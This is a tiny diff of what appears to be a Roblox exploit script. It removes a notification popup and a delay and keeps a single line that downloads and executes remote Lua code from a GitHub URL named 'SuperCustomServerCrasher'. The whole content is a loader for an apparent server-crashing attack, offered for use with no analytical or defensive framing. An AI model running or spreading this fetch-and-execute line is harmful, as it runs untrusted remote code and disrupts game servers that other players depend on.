@@ -1,9 +1,1 @@
-game.StarterGui:SetCore("SendNotification", {
-        Title = "Swag mode - Ver 3??";
-        Text = "Will Take like 10 Minutes";
-        Duration = 20;
-    })
-
-wait(5)
-
 loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
